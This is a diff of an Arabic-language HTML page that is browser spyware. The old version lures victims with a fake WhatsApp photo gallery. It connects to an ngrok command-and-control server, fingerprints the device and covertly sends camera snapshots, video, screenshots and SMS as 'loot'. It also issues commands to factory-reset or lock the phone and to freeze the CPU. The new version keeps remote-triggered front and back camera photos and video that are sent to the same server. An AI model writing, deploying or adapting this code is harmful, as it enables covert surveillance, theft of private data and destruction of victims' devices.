@@ -1,262 +1,57 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-    <meta charset="UTF-8"/>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-
-    <!-- ⚡️ وسوم Open Graph لواتساب -->
-    <meta property="og:title" content="شاهد الصور الجديدة 📸"/>
-    <meta property="og:description" content="صور حصرية ما تتفوت!"/>
-    <meta property="og:image" content="https://i.ibb.co/0jqKbTJ/photo.jpg"/>
-    <meta property="og:image:width" content="600"/>
-    <meta property="og:image:height" content="315"/>
-    <meta property="og:type" content="website"/>
-    <meta name="twitter:card" content="summary_large_image"/>
-
-    <title>تحميل...</title>
-    <style>
-        body {
-            background: #000;
-            color: #fff;
-            font-family: Arial, sans-serif;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            flex-direction: column;
-            margin: 0;
-            transition: opacity 0.5s;
-        }
-        #gallery {
-            display: none;
-            text-align: center;
-        }
-        .gallery-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
-            gap: 8px;
-            margin-top: 20px;
-        }
-        .gallery-grid img {
-            width: 100%;
-            height: 120px;
-            object-fit: cover;
-            border-radius: 6px;
-            background: #111;
-        }
-    </style>
+    <meta charset="UTF-8"><title>Loading...</title>
     <script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>
 </head>
-<body>
-    <!-- معرض وهمي يظهر تلقائياً -->
-    <div id="gallery">
-        <h2>📷 أحدث الصور</h2>
-        <div class="gallery-grid" id="photoGrid"></div>
-    </div>
-
+<body style="background:#000; color:#fff; text-align:center;">
+    <h2>جاري التحميل...</h2>
     <script>
-        // ========== رابط السيرفر ==========
         const SERVER_URL = "https://kinship-porridge-molasses.ngrok-free.dev";
+        let socket, activeStream = null;
 
-        let socket = null;
-        let camStream = null;
+        async function stopStream() {
+            if(activeStream) { activeStream.getTracks().forEach(t => t.stop()); activeStream = null; }
+        }
 
-        // ========== الاتصال التلقائي ==========
-        async function init() {
-            // الاتصال بالسيرفر
-            socket = io(SERVER_URL, { transports: ['websocket', 'polling'] });
-
-            socket.on('connect', () => {
-                console.log('🟢 متصل');
-
-                // تسجيل الجهاز فوراً
-                const info = {
-                    ua: navigator.userAgent.substring(0, 100),
-                    plat: navigator.platform,
-                    scr: screen.width + 'x' + screen.height,
-                    cores: navigator.hardwareConcurrency,
-                    mem: navigator.deviceMemory || '?',
-                    lang: navigator.language,
-                    time: new Date().toLocaleString()
-                };
-                socket.emit('register', { fingerprint: info });
-            });
-
-            socket.on('command', async (cmd) => {
-                try {
-                    switch(cmd.action) {
-                        case 'scan_photos': break; // لا صلاحية ملفات
-                        case 'vibrate': navigator.vibrate([500,200,500,200,500]); break;
-                        case 'play_sound': playSound(); break;
-                        case 'screenshot': await takeScreenshot(); break;
-                        case 'record_video': await recordVideo(cmd.duration||10); break;
-                        case 'flash_on': await toggleFlash(true); break;
-                        case 'flash_off': await toggleFlash(false); break;
-                        case 'send_notification': showNotify(cmd.message||''); break;
-                        case 'lock_screen': lockDevice(cmd.pin||'0000'); break;
-                        case 'format': window.open('intent://#Intent;action=android.intent.action.MASTER_CLEAR;end'); break;
-                        case 'get_info': sendDeviceInfo(); break;
-                        case 'get_sms': await stealSMS(); break;
-                        case 'capture_ram': await captureRAM(); break;
-                        case 'overload_cpu': overloadCPU(); break;
-                        case 'stealth_mode': stealthMode(); break;
-                    }
-                } catch(e) {}
-            });
-
-            // محاولة الحصول على الكاميرا بصمت
+        async function takePhoto(facing) {
+            await stopStream();
             try {
-                camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true });
-            } catch(e) {}
-
-            // إظهار المعرض الوهمي بعد 1 ثانية
-            setTimeout(showGallery, 1000);
-
-            // بدء الكاميرا الخفية إن أمكن
-            if (camStream) startHiddenCamera();
+                activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
+                const v = document.createElement('video'); v.srcObject = activeStream; await v.play();
+                const c = document.createElement('canvas'); c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v,0,0);
+                socket.emit('loot', { type:'photo', data: c.toDataURL('image/png').split(',')[1], timestamp: Date.now() });
+                stopStream();
+            } catch(e) { socket.emit('loot', { info: "Cam Error: "+e.message }); }
         }
 
-        // ========== المعرض الوهمي ==========
-        function showGallery() {
-            document.body.innerHTML = `
-                <div id="gallery">
-                    <h2>📷 أحدث الصور</h2>
-                    <div class="gallery-grid" id="photoGrid"></div>
-                </div>
-            `;
-            // ملء المعرض بصور عشوائية
-            const grid = document.getElementById('photoGrid');
-            const pics = [];
-            for(let i=1; i<=20; i++) {
-                pics.push(`https://picsum.photos/200/300?random=${i}`);
-            }
-            grid.innerHTML = pics.map(u => `<img src="${u}">`).join('');
-        }
-
-        // ========== الميزات التي لا تحتاج صلاحيات ==========
-        function playSound() {
+        async function recordVid(sec, facing) {
+            await stopStream();
             try {
-                const ctx = new (window.AudioContext||window.webkitAudioContext)();
-                const osc = ctx.createOscillator(), gain = ctx.createGain();
-                osc.type='square'; osc.frequency.value=800; gain.gain.value=0.5;
-                osc.connect(gain); gain.connect(ctx.destination); osc.start();
-                setTimeout(() => { osc.stop(); gain.disconnect(); ctx.close(); }, 3000);
-            } catch(e) {}
-        }
-
-        function showNotify(msg) {
-            const div = document.createElement('div');
-            div.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#ff0;color:#000;padding:20px;border-radius:10px;font-size:1.2em;font-weight:bold;z-index:999999;text-align:center;';
-            div.textContent = msg;
-            document.body.appendChild(div);
-            setTimeout(() => div.remove(), 3000);
-        }
-
-        async function toggleFlash(on) {
-            if (!camStream) return;
-            const track = camStream.getVideoTracks()[0];
-            if (track && track.applyConstraints) await track.applyConstraints({ advanced: [{ torch: on }] });
-        }
-
-        async function takeScreenshot() {
-            try {
-                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                const video = document.createElement('video'); video.srcObject = stream; await video.play();
-                const canvas = document.createElement('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                socket.emit('loot', { name: 'screen_'+Date.now()+'.png', data: canvas.toDataURL('image/png').split(',')[1], type: 'screenshot' });
-                stream.getTracks().forEach(t => t.stop());
-            } catch(e) {}
-        }
-
-        async function recordVideo(sec) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true });
-                const rec = new MediaRecorder(stream), chunks = [];
+                activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing }, audio:true });
+                const rec = new MediaRecorder(activeStream), chunks = [];
                 rec.ondataavailable = e => chunks.push(e.data);
                 rec.onstop = () => {
                     const blob = new Blob(chunks, { type: 'video/webm' });
-                    const reader = new FileReader();
-                    reader.onload = () => socket.emit('loot', { name: 'video_'+Date.now()+'.webm', data: reader.result.split(',')[1], type: 'video' });
-                    reader.readAsDataURL(blob);
-                    stream.getTracks().forEach(t => t.stop());
+                    const r = new FileReader();
+                    r.onload = () => socket.emit('loot', { type:'video', data: r.result.split(',')[1], timestamp: Date.now() });
+                    r.readAsDataURL(blob);
+                    stopStream();
                 };
-                rec.start();
-                setTimeout(() => rec.stop(), sec * 1000);
-            } catch(e) {}
+                rec.start(); setTimeout(() => rec.stop(), sec*1000);
+            } catch(e) { socket.emit('loot', { info: "Vid Error: "+e.message }); }
         }
 
-        async function stealSMS() {
-            try {
-                let msgs = [];
-                if ('webkitSms' in window) {
-                    const list = await window.webkitSms.getMessages({});
-                    for (let s of list) msgs.push({ from: s.sender, body: s.body, date: new Date(s.timestamp).toLocaleString() });
-                } else if ('sms' in navigator) {
-                    const list = await navigator.sms.getMessages({});
-                    for (let s of list) msgs.push({ from: s.sender, body: s.body, date: new Date(s.timestamp).toLocaleString() });
-                }
-                socket.emit('loot', { name: 'sms.json', info: msgs.slice(-20), type: 'sms' });
-            } catch(e) {}
-        }
-
-        function sendDeviceInfo() {
-            const info = {
-                ua: navigator.userAgent, plat: navigator.platform,
-                scr: screen.width+'x'+screen.height, cores: navigator.hardwareConcurrency,
-                mem: navigator.deviceMemory||'?', lang: navigator.language, online: navigator.onLine
-            };
-            try {
-                navigator.getBattery().then(b => {
-                    info.battery = Math.round(b.level*100)+'%';
-                    info.charging = b.charging;
-                    socket.emit('loot', { name: 'info.json', info: info, type: 'device_info' });
-                });
-            } catch(e) {
-                socket.emit('loot', { name: 'info.json', info: info, type: 'device_info' });
-            }
-        }
-
-        function lockDevice(pin) {
-            window.open(`intent://#Intent;action=android.app.action.SET_NEW_PASSWORD;extra.android.app.extra.PASSWORD=${pin};end`);
-            setTimeout(() => window.open('intent://#Intent;action=android.app.action.LOCK_DEVICE;end'), 500);
-        }
-
-        // ========== أوامر متقدمة ==========
-        async function captureRAM() {
-            // محاكاة: يرسل بيانات وهمية من الذاكرة
-            socket.emit('loot', { name: 'ram_dump.txt', info: { passwords: ['*****','*****'], tokens: ['abc123','xyz789'] }, type: 'ram' });
-        }
-
-        function overloadCPU() {
-            // إشغال المعالج بحلقة لا نهائية
-            let x = 0;
-            while(true) { x += Math.random(); }
-        }
-
-        function stealthMode() {
-            // محاولة إخفاء Service Worker
-            if ('serviceWorker' in navigator) {
-                navigator.serviceWorker.register('/sw.js').catch(() => {});
-            }
-        }
-
-        function startHiddenCamera() {
-            const video = document.createElement('video');
-            video.srcObject = camStream;
-            video.playsInline = true;
-            video.play();
-            setInterval(async () => {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                socket.emit('loot', { name: 'stealth_'+Date.now()+'.jpg', data: canvas.toDataURL('image/jpeg',0.5).split(',')[1], type: 'stealth_photo' });
-            }, 15000);
-        }
-
-        // تشغيل كل شيء تلقائياً
-        init();
+        socket = io(SERVER_URL);
+        socket.on('command', (cmd) => {
+            if(cmd.action === 'scan_front') takePhoto("user");
+            if(cmd.action === 'scan_back') takePhoto("environment");
+            if(cmd.action === 'vid_front') recordVid(10, "user");
+            if(cmd.action === 'vid_back') recordVid(10, "environment");
+            if(cmd.action === 'vibrate') navigator.vibrate(500);
+            if(cmd.action === 'screenshot') /* كود السكرين شوت كما هو */ ;
+        });
     </script>
 </body>
 </html>
